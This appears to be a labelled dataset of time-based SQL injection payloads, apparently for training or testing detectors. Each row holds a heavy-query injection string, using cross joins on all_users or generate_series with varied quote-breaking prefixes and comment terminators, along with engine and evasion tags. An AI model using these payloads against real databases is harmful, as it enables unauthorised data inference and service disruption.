payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) # msrb",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( 'wmoo' like 'wmoo",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%"" ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""%"" = """,heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( '%' = '",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( '%' = '",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'xdui' like 'xdui",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1%' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( '%' = '",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( '%' = '",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 5098 = 5098",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 7992 = 7992",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'ajkb' = 'ajkb",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 'fvov' = 'fvov",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) -- zozj",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%"" ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""%"" = """,heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""lazm"" like ""lazm",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) -- mtaq",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ""vabm"" = ""vabm",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( '%' = '",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) -- gynj",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""tfrs"" = ""tfrs",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 4976 = 4976",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) # tqmr",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' in boolean mode ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and 'dfwj' = 'dfwj",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1', ( select ( case when ( 3902 = 3902 ) then ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) else 1/ ( select 0 from dual ) end ) from dual )",heavy_query,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 'wvzw' = 'wvzw",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' ) ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'aezm' like 'aezm",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 1729 = 1729",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' in boolean mode ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) #",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""ncym"" like ""ncym",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1"" ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""wvlb"" like ""wvlb",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and 'roca' = 'roca",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt' = 'qipt",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and '%' = '",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%"" ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""%"" = """,heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""wmmg"" like ""wmmg",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ""%"" = """,heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and '%' = '",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""%"" = """,heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( ""%"" = """,heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) )",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'zetf' = 'zetf",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ""swec"" like ""swec",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'jiyx' = 'jiyx",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 'nvsy' like 'nvsy",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'yfkk' = 'yfkk",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( 'cewn' = 'cewn",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( '%' = '",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( 'xaoi' = 'xaoi",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'jjmt' = 'jjmt",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""ubxw"" like ""ubxw",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( 'wweo' = 'wweo",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'pgyl' = 'pgyl",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ""%"" = """,heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( '%' = '",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""vhey"" = ""vhey",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%"" ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( ""%"" = """,heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( '%' = '",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( '%' = '",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'eflk' = 'eflk",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( '%' = '",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 'xori' like 'xori",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 'ldqq' = 'ldqq",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""%"" = """,heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""ctrr"" = ""ctrr",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%"" and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""nnmz"" like ""nnmz",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( 'qvoy' = 'qvoy",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' in boolean mode ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) #",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""ecoa"" like ""ecoa",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1%"" and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""%"" = """,heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' in boolean mode ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) #",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( 8997 = 8997",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 4450 = 4450",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""%"" = """,heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) ) ||'",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( 'bhlx' like 'bhlx",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1%' ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( '%' = '",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'tqvy' like 'tqvy",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1%"" ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'tfnb' = 'tfnb",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""uosc"" = ""uosc",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( '%' = '",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( ""khuw"" like ""khuw",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1%"" or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""%"" = """,heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ""jzmg"" = ""jzmg",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 )",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'obmu' = 'obmu",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""oxxi"" = ""oxxi",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'wytg' = 'wytg",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""jtgs"" like ""jtgs",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) ) +'",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""eslo"" like ""eslo",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1"" ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""ddun"" = ""ddun",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) # jmki",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 'ekla' = 'ekla",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( 'hube' = 'hube",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'bzak' like 'bzak",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1%"" ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""%"" = """,heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 1164 = 1164",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( '%' = '",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ""bhmu"" like ""bhmu",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and 'fahy' like 'fahy",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
